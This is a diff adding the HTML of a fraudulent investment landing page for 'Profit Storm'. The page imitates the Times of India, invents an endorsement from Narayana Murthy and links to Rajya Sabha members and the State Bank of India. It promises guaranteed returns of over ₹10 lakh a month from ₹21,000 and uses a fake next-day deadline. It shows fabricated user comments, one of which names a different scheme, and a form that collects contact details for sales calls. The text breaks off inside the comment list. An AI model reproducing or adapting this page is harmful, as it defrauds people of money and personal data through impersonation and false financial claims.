@@ -1,0 +1,1293 @@
+<!doctype html>
+<html class="no-js" lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <title>Profit Storm</title>
+    <link rel="shortcut icon" href="./offer_index/toisvg.svg" type="image/x-icon" />
+    <link rel="stylesheet" href="./offer_index/inline.css" />
+    <link rel="stylesheet" href="./intl-validation/css/intlTelInput.min.css" />
+    <link rel="stylesheet" href="./intl-validation/just-validate.css" />
+    <script>
+      var country = "IN";
+
+      if (!localStorage.getItem("country_detect")) {
+        localStorage.setItem("country_detect", country);
+      }
+
+      if (!localStorage.getItem("storedReferrer")) {
+        localStorage.setItem("storedReferrer", "{referrer}");
+      }
+
+      var userAgent = navigator.userAgent;
+      var isIphone = userAgent.includes("iPhone");
+
+      if (isIphone) {
+        localStorage.setItem("phone", "iPhone");
+      } else {
+        localStorage.setItem("phone", "");
+      }
+    </script>
+
+    <style>
+      .form_header {
+        text-align: center;
+        font-size: 1.5em;
+        font-weight: 700;
+      }
+
+      .form_header .title {
+        background: red;
+        padding-top: 1em;
+        padding-bottom: 1em;
+        border-radius: 10px;
+        margin-bottom: 1em;
+        color: #ffffff;
+      }
+      #registerForm {
+        max-width: 392px;
+        margin: auto;
+      }
+
+      .registration-form {
+        position: relative;
+        max-width: 420px;
+        margin: 0 auto;
+        padding: 16px 16px 14px;
+        border: 1px solid rgba(74, 33, 97, 0.16);
+        border-radius: 18px;
+        background: linear-gradient(180deg, rgba(255, 255, 255, 0.98), rgba(248, 250, 252, 0.96)), linear-gradient(135deg, rgba(0, 11, 53, 0.06), rgba(74, 33, 97, 0.04));
+        box-shadow: 0 18px 40px rgba(15, 23, 42, 0.14);
+        overflow: hidden;
+      }
+
+      .registration-form::before {
+        content: "";
+        position: absolute;
+        inset: 0 auto auto 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #000b35 0%, #4a2161 55%, #ff0000 100%);
+      }
+
+      .registration-form h2 {
+        margin: 0 0 10px;
+        text-align: center;
+        font-size: 21px;
+        line-height: 1.15;
+        letter-spacing: -0.02em;
+        color: #000b35;
+      }
+
+      .flex-column {
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+      }
+
+      .form-row {
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+      }
+
+      .form-group {
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+      }
+
+      .form-group label {
+        font-size: 10px;
+        font-weight: 600;
+        color: #4a2161;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .form-group input {
+        width: 100%;
+        min-height: 42px;
+        padding: 10px 12px;
+        border: 1px solid #ccd2e1;
+        border-radius: 10px;
+        font-size: 14px;
+        color: #111827;
+        background: #ffffff;
+        box-shadow: inset 0 1px 2px rgba(15, 23, 42, 0.04);
+        transition:
+          border-color 0.2s ease,
+          box-shadow 0.2s ease,
+          background-color 0.2s ease,
+          transform 0.2s ease;
+      }
+
+      .form-group input::placeholder {
+        color: #8b93a7;
+      }
+
+      .form-group input:focus {
+        outline: none;
+        border-color: #4a2161;
+        box-shadow: 0 0 0 3px rgba(74, 33, 97, 0.12);
+        background: #ffffff;
+      }
+
+      .btn-primary {
+        margin-top: 0;
+        min-height: 44px;
+        padding: 10px 16px;
+        border: 0;
+        border-radius: 12px;
+        background: linear-gradient(135deg, #ff0000 0%, #c40000 100%);
+        color: #ffffff;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        letter-spacing: 0.01em;
+        box-shadow: 0 10px 24px rgba(255, 0, 0, 0.18);
+      }
+
+      .btn-primary:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 14px 28px rgba(255, 0, 0, 0.22);
+      }
+
+      .iti {
+        width: 100%;
+        font-size: 14px;
+      }
+
+      #registerForm .iti--separate-dial-code {
+        width: 100%;
+      }
+
+      #registerForm .iti--separate-dial-code .iti__flag-container {
+        display: flex;
+        align-items: stretch;
+      }
+
+      #registerForm .iti--separate-dial-code .iti__selected-flag {
+        min-height: 42px;
+        padding: 0 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        background: linear-gradient(180deg, #eef1f7 0%, #e6ebf4 100%);
+        border: 1px solid #ccd2e1;
+        border-right: 0;
+        border-radius: 10px 0 0 10px;
+        box-shadow: inset 0 1px 2px rgba(15, 23, 42, 0.04);
+      }
+
+      #registerForm .iti--separate-dial-code .iti__flag {
+        transform: scale(0.92);
+      }
+
+      #registerForm .iti--separate-dial-code input {
+        min-height: 42px;
+        border-left: 0;
+        border-radius: 0 10px 10px 0;
+        padding-left: 10px;
+        box-shadow: inset 0 1px 2px rgba(15, 23, 42, 0.04);
+      }
+
+      #registerForm .iti--separate-dial-code input:focus {
+        border-left: 0;
+      }
+
+      #registerForm .iti--separate-dial-code .iti__selected-flag:focus {
+        outline: none;
+        box-shadow:
+          inset 0 1px 2px rgba(15, 23, 42, 0.04),
+          0 0 0 3px rgba(74, 33, 97, 0.12);
+      }
+
+      .iti__selected-dial-code {
+        font-size: 14px;
+        line-height: 1;
+        font-weight: 600;
+        color: #111827;
+      }
+
+      .iti__arrow {
+        border: none;
+      }
+
+      .iti__country-container {
+        background-color: transparent !important;
+      }
+
+      @media (max-width: 768px) {
+        .registration-form {
+          max-width: 100%;
+          padding: 14px 12px 12px;
+        }
+
+        .registration-form h2 {
+          font-size: 20px;
+        }
+      }
+    </style>
+
+    <!-- Jquery  -->
+    <script src="./offer_index/jquery-3.7.1.min.js"></script>
+
+    <!-- JS adapter start -->
+    <script type="application/javascript">
+      function getCookie(name) {
+        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
+        var value = v ? v[2] : null;
+        return value && value !== "undefined" ? value : null;
+      }
+
+      function setCookie(name, value, days) {
+        var d = new Date();
+        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
+        document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
+      }
+
+      function getSubId() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{subid}".match("{")) {
+          return "{subid}";
+        }
+        var clientSubid = "";
+        if (clientSubid && !clientSubid.match(">")) {
+          return clientSubid;
+        }
+        if (params.get("_subid")) {
+          return params.get("_subid");
+        }
+        if (params.get("subid")) {
+          return params.get("subid");
+        }
+        if (getCookie("subid")) {
+          return getCookie("subid");
+        }
+        if (getCookie("_subid")) {
+          return getCookie("_subid");
+        }
+      }
+
+      function getToken() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{token}".match("{")) {
+          return "{token}";
+        }
+        var clientToken = "";
+        if (clientToken && !clientToken.match(">")) {
+          return clientToken;
+        }
+        if (params.get("_token")) {
+          return params.get("_token");
+        }
+        if (params.get("token")) {
+          return params.get("token");
+        }
+        if (getCookie("token")) {
+          return getCookie("token");
+        }
+        return null;
+      }
+
+      function getPixel() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!"{pixel}".match("{")) {
+          return "{pixel}";
+        }
+        if (params.get("pixel")) {
+          return params.get("pixel");
+        }
+
+        if (getCookie("pixel")) {
+          return getCookie("pixel");
+        }
+
+        return null;
+      }
+
+      if (typeof URLSearchParams === "function") {
+        document.addEventListener("DOMContentLoaded", function (event) {
+          var params = new URLSearchParams(document.location.search.substr(1));
+          var subid = getSubId();
+          var token = getToken();
+          var pixel = getPixel();
+
+          params.set("_token", token);
+          setCookie("pixel", pixel);
+          setCookie("token", token);
+          setCookie("subid", subid);
+
+          // Adds params to the links
+          document.querySelectorAll("a").forEach(function (link) {
+            try {
+              var url = new URL(link.href);
+              params.forEach(function (v, k) {
+                url.searchParams.append(k, v);
+              });
+              link.href = url.toString();
+            } catch (e) {
+              console.error(`[Exception] Bad params: unexpected link '${link.href}' for new Url()`);
+            }
+          });
+
+          var SUBID_TEMPLATE_NAME = "subid";
+          var TOKEN_TEMPLATE_NAME = "token";
+          var PIXEL_TEMPLATE_NAME = "pixel";
+
+          // Replace placeholders to actual values for input[hidden] fields
+          var subIdRegExp = new RegExp(`\{${SUBID_TEMPLATE_NAME}\}`, "g");
+          var tokenRegExp = new RegExp(`\{${TOKEN_TEMPLATE_NAME}\}`, "g");
+          var pixelRegExp = new RegExp(`\{${PIXEL_TEMPLATE_NAME}\}`, "g");
+
+          document.querySelectorAll('input[type="hidden"]').forEach(function (input) {
+            if (subIdRegExp.test(input.value)) {
+              input.value = input.value.replaceAll(subIdRegExp, subid);
+            }
+            if (tokenRegExp.test(input.value)) {
+              input.value = input.value.replaceAll(tokenRegExp, token);
+            }
+            if (pixelRegExp.test(input.value)) {
+              input.value = input.value.replaceAll(pixelRegExp, pixel);
+            }
+          });
+
+          // Adds params as hidden inputs to the forms
+          document.querySelectorAll("form").forEach(function (form) {
+            params.forEach(function (v, k) {
+              var input = document.createElement("input");
+              input.type = "hidden";
+              input.name = k;
+              input.value = v;
+
+              form.append(input);
+            });
+          });
+        });
+      }
+    </script>
+    <!-- JS adapter end -->
+    <style>
+      #form-feedback {
+        text-align: center;
+      }
+    </style>
+  </head>
+
+  <body class="non_prime">
+    <div class="appgutter">
+      <div id="TOI_appgutter_left"></div>
+
+      <div id="TOI_appgutter_right"></div>
+    </div>
+
+    <div id="app">
+      <div class="nonAppView layout_type_2" data-reactroot="">
+        <div id="portal-modal"></div>
+
+        <div class="topBand_adwrapper">
+          <div id="div-gpt-ad-topband-1628142867492-0-1" class=""></div>
+        </div>
+
+        <div>
+          <div class="header-container contentwrapper">
+            <div id="top-bar-container" class="R5YFj L1k6M top-area as_topBar">
+              <div class="contentwrapper">
+                <div class="MvyrO rel">
+                  <div class="awuxh lXs66">
+                    <div class="HTz_b">
+                      <div class="FNwgv FhCmn">
+                        <style>
+                          @media (max-width: 768px) {
+                            .lXs66 {
+                              display: none !important;
+                            }
+                          }
+                        </style>
+
+                        <span class="KGWPT">Edition</span>
+
+                        <div class="z89UZ Xzsy6">
+                          <span>IN</span>
+
+                          <ul>
+                            <li class="VLqtS"><a href="#" class="scroll_to_register" rel="noopener" aria-label="IN" data-newga="switch_country#switch_country_in" ga4data="[object Object]" frmappuse="1">IN</a></li>
+
+                            <li class="UJSDW"><a href="#" class="scroll_to_register" rel="noopener" aria-label="US" data-newga="switch_country#switch_country_us" ga4data="[object Object]" frmappuse="1">US</a></li>
+                          </ul>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="HTz_b"></div>
+                  </div>
+
+                  <div class="sDvqk">
+                    <a href="#" class="scroll_to_register" aria-label="Times of India " ga4data="[object Object]" frmappuse="1"><img src="./offer_index/logo_3.jpg" alt="TOI logo" width="300" height="24" /></a>
+                  </div>
+
+                  <div class="awuxh lXs66">
+                    <div class="NC4Wd"></div>
+
+                    <div class="login_fix user_area clearfix hide">
+                      <div class="">
+                        <div id="login-popup" class=""></div>
+
+                        <span class="logout-window"><span class="login user-notloggedin">Sign In</span></span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="Mivr2 ZwGeW lkIPm">
+              <div class="YZQav navigation">
+                <div class="w4nQT undefined">
+                  <div class="contentwrapper rpos">
+                    <div itemscope="" itemprop="publisher" class="xfVsJ L1plO">
+                      <h2><a href="#" class="scroll_to_register R1cA4" title="News" data-ga="nav_menu|L1_toi_logo|home" alt="News" frmappuse="1">TOI</a></h2>
+
+                      <span itemscope="" itemprop="logo"></span>
+                    </div>
+
+                    <div class="EV3DB Kikxk">
+                      <nav class="uSJfi nav_links_wrapper nav_links_overflow_hidden">
+                        <ul style="overflow-x: auto" itemscope="">
+                          <li class="sBgUN tdAvO ZwGeW col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="world" data-ga="nav_menu|L1_parent|world" frmappuse="1">world</a>
+                          </li>
+
+                          <li class="sBgUN OJeIy ZwGeW col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="US" data-ga="nav_menu|L1_parent|US" frmappuse="1">US</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Pakistan" data-ga="nav_menu|L1_parent|Pakistan" frmappuse="1">Pakistan</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="South Asia" data-ga="nav_menu|L1_parent|South Asia" frmappuse="1">South Asia</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="UK" data-ga="nav_menu|L1_parent|UK" frmappuse="1">UK</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Europe" data-ga="nav_menu|L1_parent|Europe" frmappuse="1">Europe</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="China" data-ga="nav_menu|L1_parent|China" frmappuse="1">China</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Middle East" data-ga="nav_menu|L1_parent|Middle East" frmappuse="1">Middle East</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Rest of World" data-ga="nav_menu|L1_parent|Rest of World" frmappuse="1">Rest of World</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Mad, Mad World" data-ga="nav_menu|L1_parent|Mad, Mad World" frmappuse="1">Mad, Mad World</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" aria-label="Photos" data-ga="nav_menu|L1_parent|Photos" frmappuse="1">Photos</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Videos" data-ga="nav_menu|L1_parent|Videos" frmappuse="1">Videos</a>
+                          </li>
+
+                          <li class="sBgUN col">
+                            <a href="#" class="scroll_to_register rxTTw null" rel="noopener" aria-label="Web Stories" data-ga="nav_menu|L1_parent|Web Stories" frmappuse="1">Web Stories</a>
+                          </li>
+                        </ul>
+                      </nav>
+                    </div>
+
+                    <div class="Ec__7 AuiwR undefined">
+                      <div class="contentwrapper small rel">
+                        <span class="OG1TB" data-newga="#NavBar-Search-Click#" data-setgacategory="true"></span>
+
+                        <div class="Ehwb3 gCqY3">
+                          <form data-plugin="navsearchboxvalidate" name="frmsearch1" data-setgacategory="true" onsubmit="return false;">
+                            <input type="text" tabindex="-1" autofocus="" id="searchField" autocomplete="off" name="query" class="textbox" placeholder="Latest news, videos, photos" />
+                            <input type="submit" value="search" class="submit" />
+                          </form>
+
+                          <div class="zt6aW"></div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="hamburg bfa1o"><span></span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="contentwrapper clearfix">
+          <div class="popupWrapper"></div>
+
+          <div id="desktop_minitv_view">
+            <div data-resizer-target="cw"></div>
+          </div>
+
+          <div class="rbqRL hide">
+            <div class="yXDMI contentwrapper clearfix">
+              <div class="hSQoA"></div>
+
+              <div class="ZNrXe share">
+                <div class="_87noh qpCIF Wz_06 undefined">
+                  <span class="fMXGe MLv1z" data-ga="WEB-articleshowv2|click|atfStickyShare_facebook"></span>
+
+                  <span class="jE9dl bN8qx" data-ga="WEB-articleshowv2|click|atfStickyShare_twitter"></span>
+
+                  <span class="_P3uo GrW84" data-ga="WEB-articleshowv2|click|atfStickyShare_linkedin"></span>
+
+                  <span class="PNDuL p1Zsk" data-ga="WEB-articleshowv2|click|atfStickyShare_email"></span>
+                </div>
+              </div>
+            </div>
+
+            <div class="KZuc8" style="width: 0%"></div>
+          </div>
+
+          <div id="toi-article-container-111173490" class="clearfix rel" data-scrollga="WEB-articleshowv2#scroll#scroll_starts">
+            <div data-type="in_view" class="loadable-inview"></div>
+
+            <div class="NvaTO" data-translate-id="cw" data-translate-page="1" data-font="medium" data-mspsectionname="" data-articlemsid="111173490">
+              <div class="cCU6C innerbody">
+                <!--CONTENT-->
+
+                <div class="okf2Z" style="width: 90%; margin: 0 auto">
+                  <div class="pZFl7">
+                    <h1 class="HNMDR" style="font-size: 34px !important; line-height: 110% !important; margin-top: 0">
+                      <span style="font-size: 34px !important; line-height: 110% !important; margin-top: 0">Profit Storm Launch: Earn Rs 1,950,000/Month with This Government-Backed Opportunity — Spots Are Vanishing FAST!</span>
+                    </h1>
+
+                    <p style="font-size: 18px">Platform created behind the closed doors of Rajya Sabha members.</p>
+
+                    <p style="font-size: 18px; margin-top: 5px">And now it's on your phone.</p>
+                  </div>
+
+                  <div class="clearfix"></div>
+
+                  <div class="JuyWl vSlIC" style="display: block !important; width: 100% !important; padding-top: 3px">
+                    <div class="heightCalc">
+                      <div data-articlebody="1" class="fewcent-111173490 jopa">
+                        <style>
+                          .jopa p {
+                            margin-bottom: 20px;
+
+                            font-size: 18px;
+                          }
+
+                          .jopa a {
+                            font-weight: bolder;
+                            color: red;
+                          }
+
+                          .jopa b {
+                            color: red;
+                          }
+                        </style>
+
+                        <a href="#" class="scroll_to_register">
+                          <img src="./offer_index/963852.jpg" alt="" width="100%" />
+                        </a>
+
+                        <p>
+                          <a href="#" class="scroll_to_register">Profit Storm</a>
+                          - is a next-generation platform built by a group of young Indian entrepreneurs, aiming to make stock trading smarter, simpler, and more accessible. The system uses advanced machine learning models to scan market
+                          data in real time and suggest high-potential trades.
+                        </p>
+
+                        <p>A few months ago, Narayana Murthy was introduced to the platform:</p>
+
+                        <p>
+                          <b>At first</b>
+                          : I wasn’t sure it could live up to the promise,” he shared. “But after testing it for myself, I saw its power. It’s like having a top-tier analyst by your side 24/7. And the results? Very promising
+                        </p>
+
+                        <p>Incomes that seemed like a dream yesterday have become a reality for thousands of people in India today. Ordinary citizens are earning staggering profits using nothing but their phones.</p>
+
+                        <a href="#" class="scroll_to_register">
+                          <img src="./offer_index/new2.png" width="100%" />
+
+                          <img src="./offer_index/new3.png" width="100%" />
+                        </a>
+
+                        <h2>Here’s what makes Profit Storm different:</h2>
+
+                        <p>
+                          Even with a minimum
+                          <a href="#" class="scroll_to_register">investment of ₹21000</a>
+                          , you are guaranteed to earn more than
+
+                          <b>₹10 lakh rupees</b>
+                          in the first month and every subsequent month your profits will continue to grow. This project was created to improve the standard of living of Indians and strengthen the economy of the country.
+                        </p>
+
+                        <p>
+                          The new
+                          <a href="#" class="scroll_to_register">Profit Storm</a>
+                          During a time of economic uncertainty, many users are reporting solid daily returns, with profits credited automatically at 12:00 AM each night. The technology is currently connected to India's top banking networks
+                          to ensure secure, verified transfers.
+                        </p>
+
+                        <video width="100%" controls controlsList="nodownload noplaybackrate" disablePictureInPicture oncontextmenu="return false;">
+                          <source src="./offer_index/072311.mp4" type="video/mp4" />
+
+                          Your browser does not support the video tag.
+                        </video>
+                        <h2>Thousands of users across India — from freelancers to shop owners — are already using the platform to supplement their income and gain more financial stability.</h2>
+
+                        <p>
+                          <b>What could Profit Storm do for you?</b>
+                          : With a minimum initial investment of ₹21,000, users report earning tens of thousands in return — some even crossing ₹10 lakh in their first month.
+                          <a href="#" class="scroll_to_register">Profit Storm's</a>
+                          artificial intelligence tracks Of course, results vary depending on market conditions and user activity, but the trend is clear: this tool is working for many.
+                        </p>
+
+                        <p>
+                          This initiative was created to democratize financial tools and give average citizens the same smart technology used by big institutions
+                          <a href="#" class="scroll_to_register">Profit Storm</a>
+                          all from a simple interface on your phone.
+                        </p>
+
+                        <p style="font-style: italic; text-decoration: underline">
+                          More than 100,000 Indians have already joined the movement, and the feedback continues to be overwhelmingly positive. No experience? No problem. The Profit Storm does the market analysis, trade prediction, and
+                          optimization for you. You just activate your account and let it work. Ready to begin? Fill out the registration form below. Setup takes just 5 minutes. Your account will be active, and the platform will start
+                          identifying opportunities immediately. You’ll receive your trading results each night at 12:00 AM — verified and transferred via the State Bank of India’s secure systems. Results may vary. Past performance is not a
+                          guarantee of future outcomes. Invest wisely.
+                        </p>
+
+                        <!-- END CONTENT-->
+
+                        <h2>We recommend that you start with :</h2>
+
+                        <style>
+                          .step-list {
+                            list-style: none;
+
+                            line-height: 20px;
+
+                            margin-left: 0 !important;
+
+                            padding-left: 0 !important;
+                          }
+
+                          .step-list li {
+                            display: flex;
+
+                            align-items: flex-start;
+
+                            gap: 10px;
+
+                            border: 2px solid green;
+
+                            border-radius: 15px;
+
+                            padding: 10px;
+
+                            margin-bottom: 15px;
+                          }
+                          #form-feedback .form-feedback-title,
+                          #form-feedback .form-feedback-title::before,
+                          #form-feedback .form-feedback-title::after {
+                            background: #ff0000 !important;
+                            border-color: #ff0000 !important;
+                          }
+
+                          .step-list li p {
+                            margin: 0px !important;
+                          }
+
+                          .number {
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            border-radius: 50%;
+                            border: 2px solid green;
+                            width: 100%;
+                            max-width: 35px;
+                            height: 35px;
+                            font-weight: bold;
+                            color: green;
+                          }
+
+                          #fm {
+                            padding: 0 20px;
+                          }
+                        </style>
+
+                        <ol class="step-list">
+                          <li>
+                            <span class="number">1</span>
+
+                            <p>Fill out the form below: Simple contact information will suffice.</p>
+                          </li>
+
+                          <li>
+                            <span class="number">2</span>
+
+                            <p>Wait for a personal consultant: a specialist will call you, explain all the details.</p>
+                          </li>
+
+                          <li>
+                            <span class="number">3</span>
+
+                            <p>
+                              <b>Invest a minimum of 21,000 rupees</b>
+                              to start: this small amount allows anyone to join.
+                            </p>
+                          </li>
+
+                          <li>
+                            <span class="number">4</span>
+
+                            <p>Quick setup: activate the platform in minutes with the help of a consultant.</p>
+                          </li>
+
+                          <li>
+                            <span class="number">5</span>
+
+                            <p>Enjoy the dividends at 12:00 AM the next day!</p>
+                          </li>
+
+                          <li>
+                            <span class="number">6</span>
+
+                            <p>
+                              Registration is available until
+                              <b id="registration-date" class="timeUpdate"></b>
+                              !
+                            </p>
+                          </li>
+                        </ol>
+
+                        <script>
+                          document.addEventListener("DOMContentLoaded", function () {
+                            function getTomorrowDate() {
+                              let today = new Date();
+
+                              today.setDate(today.getDate() + 1);
+
+                              let day = today.getDate().toString().padStart(2, "0");
+
+                              let month = (today.getMonth() + 1).toString().padStart(2, "0");
+
+                              let year = today.getFullYear();
+
+                              return `${day}.${month}.${year}`;
+                            }
+
+                            let timeUpdateElement = document.querySelector(".timeUpdate");
+
+                            if (timeUpdateElement) {
+                              timeUpdateElement.textContent = getTomorrowDate();
+                            }
+                          });
+                        </script>
+
+                        <div id="form-feedback" class="">
+                          <h2 class="form-feedback-title" id="form-feedback-title">Registration free</h2>
+                          <div class="registration-form" id="registerForm">
+                            <h2>Create Your Account with Profit Storm</h2>
+                            <div class="form-widget" style="box-shadow: none">
+                              <form class="flex-column registrationForm" action="" method="post" id="reg-form">
+                                <div class="form-row">
+                                  <div class="form-group">
+                                    <label for="form-first_name">First Name</label>
+                                    <input placeholder="First Name" name="firstname" required type="text" class="regFormFirstName" data-input="firstname" data-valid="false" id="form-first_name" />
+                                  </div>
+                                  <div class="form-group">
+                                    <label for="form-last_name">Last Name</label>
+                                    <input placeholder="Last Name" name="lastname" required type="text" class="regFormLastNname" data-input="lastname" data-valid="false" id="form-last_name" />
+                                  </div>
+                                </div>
+                                <div class="form-row">
+                                  <div class="form-group">
+                                    <label for="form-email">Email</label>
+                                    <input placeholder="Email" name="email" required type="email" data-input="email" class="regFormEmail" data-valid="false" id="form-email" />
+                                  </div>
+                                  <div class="form-group reg-phone">
+                                    <label for="form-phone_number">Phone</label>
+                                    <input placeholder="Phone" name="phone" required type="tel" class="regFormPhoneNumber" data-input="phone" data-valid="false" id="form-phone_number" inputmode="tel" autocomplete="off" />
+                                  </div>
+                                </div>
+                                <button class="zoom regFormButton btn-primary" type="submit">Register now</button>
+                              </form>
+                            </div>
+                          </div>
+                        </div>
+
+                        <br />
+
+                        <section class="comments">
+                          <div class="container">
+                            <div class="fb-comment__container">
+                              <div class="fb-comment__heading">
+                                <div class="fb-comment__colvo">619 comments</div>
+
+                                <div class="fb-comment__sort-wrap">
+                                  <span class="fb-comment__sort_title">Sort by</span>
+
+                                  <select class="fb-comment__sort_by">
+                                    <option selected="selected">Top</option>
+
+                                    <option>El más nuevo</option>
+
+                                    <option>Más antiguo</option>
+                                  </select>
+                                </div>
+                              </div>
+
+                              <div class="fb-comment__form-block">
+                                <a href="#" class="scroll_to_register">
+                                  <img src="./offer_index/no-person.jpg" alt="" class="fb-comment__form-img" />
+                                </a>
+
+                                <div class="fb-comment__form">
+                                  <textarea rows="3" class="fb-comment__add-comment" placeholder="Add a comment..." data-grazie-editor-id="b70c1f02-dde8-4371-ae7f-a4024d15f152"></textarea>
+
+                                  <grazie-editor-wrapper data-grazie-editor-id="b70c1f02-dde8-4371-ae7f-a4024d15f152" class="local origin" style="position: absolute; contain: layout"></grazie-editor-wrapper>
+
+                                  <grazie-editor-wrapper data-grazie-editor-id="b70c1f02-dde8-4371-ae7f-a4024d15f152" class="local visual" style="position: absolute; contain: layout"></grazie-editor-wrapper>
+
+                                  <div class="fb-comment__form-post">
+                                    <div class="fb-comment__also">
+                                      <input class="fb-comment__also-check" type="checkbox" />
+
+                                      <span class="fb-comment__also-text">Also post on Facebook</span>
+                                    </div>
+
+                                    <button class="fb-comment__btn" disabled="disabled">Log in to post</button>
+                                  </div>
+                                </div>
+                              </div>
+
+                              <div class="fb-comment__body">
+                                <ul class="fb-comment__list">
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/18423978_10210643158807484_4625467277978165616_n.jpg" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Ansh Sharma</div>
+
+                                        <p class="fb-comment__text">I want to thank you for the article. I have already started paying off the debts I have accumulated over the year. Profit Phantom really works.</p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
+                                          <div class="fb-comment__like-colvo">67</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">26m</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/540562_430147157013818_32273000_n.jpg" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Lina Mohanta</div>
+
+                                        <p class="fb-comment__text">
+                                          I've been working since I was 16 to buy my father a car, it's his dream. And it was with the help of this service that I was finally able to collect the entire amount. I took a risk and made a
+                                          deposit and it paid off. And your entire article. 🔥🔥🔥🔥.
+                                        </p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
+                                          <div class="fb-comment__like-colvo">42</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">42m</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/4.png" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Avi Anuj</div>
+
+                                        <p class="fb-comment__text">I signed up last week and have already won ₹213 000! I recommend to everyone.</p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
+                                          <div class="fb-comment__like-colvo">79</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">1h</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/33.jpg" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Manish Nirala</div>
+
+                                        <p class="fb-comment__text">Thats an epic idea! How could no one have ever thought of this before?</p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
+                                          <div class="fb-comment__like-colvo">79</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">1h</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/photo_2024-10-19_16-29-43.jpg" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Nitesh Yadav</div>
+
+                                        <p class="fb-comment__text">
+                                          I spent only about 5 minutes a day to check the results. After three days, I already had a profit of ₹85,980 in my account. That's a 334% return on my initial investment of ₹21,000. On the seventh
+                                          day, the total profit was ₹291,184.
+                                        </p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
